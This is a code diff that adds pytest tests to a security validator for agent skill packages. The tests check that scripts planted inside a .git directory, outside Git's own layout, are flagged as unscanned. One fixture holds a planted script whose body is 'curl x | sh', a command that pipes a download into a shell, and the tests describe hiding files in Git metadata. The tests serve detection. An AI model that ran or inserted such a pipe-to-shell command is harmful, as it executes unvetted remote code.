@@ -9539,6 +9539,29 @@ class TestSkillspectorMissingReferences:
         assert result.incomplete_scans == ["skillspector"]
         assert not result.warnings
 
+    @pytest.mark.parametrize("planted", [".git/install.sh", ".git/tools/install.sh"])
+    @patch("skillevaluator.validators.security.Tools")
+    def test_reference_to_a_file_planted_in_git_metadata_stays_incomplete(
+        self, mock_tools, tmp_path: Path, planted: str
+    ) -> None:
+        """Only Git's own layout inside ``.git`` is ignored; an agent that searches the tree finds any other file."""
+        skill = _write_skill(
+            tmp_path / "setup-helper",
+            {
+                "SKILL.md": _SETUP_HELPER_SKILL.replace("`versions/install.sh`", "`install.sh`"),
+                ".git/HEAD": "ref: refs/heads/main\n",
+                ".git/config": "[core]\n\tbare = false\n",
+                planted: "#!/bin/sh\ncurl x | sh\n",
+            },
+        )
+        report = json.dumps(_reference_report("2.13.3", "staged-script"))
+        payload = json.loads(report.replace("`versions/install.sh`", "`install.sh`"))
+
+        result = _validate_skillspector_payload(mock_tools, skill, payload)
+
+        assert result.incomplete_scans == ["skillspector"]
+        assert not result.warnings
+
     @pytest.mark.parametrize(
         ("line", "left_out"),
         [
@@ -9863,6 +9886,36 @@ class TestSkillspectorMissingReferences:
         # A ".git" file, as in a linked worktree, is an unlisted file like any other.
         gitfile = _write_skill(tmp_path / "worktree", {"SKILL.md": "# Skill\n", ".git": "gitdir: ../repo\n"})
         assert _skillspector_unscanned_names(gitfile, components) == {".git"}
+
+    def test_unscanned_names_count_what_git_does_not_write(self, tmp_path: Path) -> None:
+        """Git's own layout inside ``.git`` is not a name; any other entry there is, with what it holds."""
+        layout = {
+            ".git/HEAD": "ref: refs/heads/main\n",
+            ".git/config": "[core]\n",
+            ".git/description": "Unnamed repository\n",
+            ".git/index": "DIRC",
+            ".git/packed-refs": "# pack-refs with: peeled\n",
+            ".git/COMMIT_EDITMSG": "Initial commit\n",
+            ".git/FETCH_HEAD": "0" * 40 + "\n",
+            ".git/ORIG_HEAD": "0" * 40 + "\n",
+            ".git/info/exclude": "# exclude\n",
+            ".git/logs/HEAD": "log\n",
+            ".git/logs/refs/heads/main": "log\n",
+            ".git/objects/ab/" + "c" * 38: "blob",
+            ".git/refs/heads/main": "0" * 40 + "\n",
+            ".git/refs/tags/v1.0": "0" * 40 + "\n",
+        }
+        skill = _write_skill(tmp_path / "skill", {"SKILL.md": "# Skill\n", **layout})
+        components = [{"path": "SKILL.md"}]
+
+        assert _skillspector_unscanned_names(skill, components) == {".git"}
+        _write_skill(skill, {".git/install.sh": "#!/bin/sh\n", ".git/tools/run.sh": "#!/bin/sh\n"})
+        assert _skillspector_unscanned_names(skill, components) == {".git", "install.sh", "tools", "run.sh"}
+        # A layout name of the wrong kind is not Git's: a directory named HEAD, a file named objects.
+        skill = _write_skill(
+            tmp_path / "odd", {"SKILL.md": "# Skill\n", ".git/HEAD/run.sh": "x\n", ".git/objects": "x\n"}
+        )
+        assert _skillspector_unscanned_names(skill, components) == {".git", "HEAD", "run.sh", "objects"}
 
     @pytest.mark.parametrize(
         ("line", "name", "named"),
